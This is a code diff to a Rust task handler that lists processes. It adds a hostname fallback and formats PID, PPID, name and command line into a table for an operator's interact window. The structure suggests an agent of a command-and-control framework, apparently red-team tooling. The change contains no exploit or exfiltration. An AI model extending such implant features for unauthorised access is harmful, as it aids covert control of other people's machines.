@@ -238,19 +238,43 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
 
     match list_processes() {
         Ok(mut procs) => {
+            // Resolve host: use provided, or try to detect from system
+            let host = params.host
+                .filter(|h| !h.is_empty())
+                .or_else(|| {
+                    crate::sys::metadata::hostname()
+                })
+                .unwrap_or_default();
+
             // Set host + mark for auto-cleanup on all entries
             for p in &mut procs {
                 p.update_deleted = true;
-                if let Some(ref host) = params.host {
-                    p.host = host.clone();
-                }
+                p.host = host.clone();
             }
+
+            // Build formatted output for interact window
             let count = procs.len();
+            let mut out = format!("Process List ({count} total)\n");
+            out.push_str(&format!("{:<8} {:<8} {:<24} {}\n", "PID", "PPID", "NAME", "CMDLINE"));
+            out.push_str(&format!("{:-<80}\n", ""));
+            for p in procs.iter().take(50) {
+                out.push_str(&format!(
+                    "{:<8} {:<8} {:<24} {}\n",
+                    p.process_id,
+                    p.parent_process_id.map_or("-".into(), |v| v.to_string()),
+                    if p.name.len() > 24 { format!("{}…", &p.name[..23]) } else { p.name.clone() },
+                    p.command_line.as_deref().unwrap_or("-"),
+                ));
+            }
+            if count > 50 {
+                out.push_str(&format!("… and {} more\n", count - 50));
+            }
+
             TaskResponse {
                 task_id: task.id,
                 completed: Some(true),
                 status: Some("completed".into()),
-                user_output: Some(format!("{count} processes")),
+                user_output: Some(out),
                 processes: procs,
                 ..Default::default()
             }
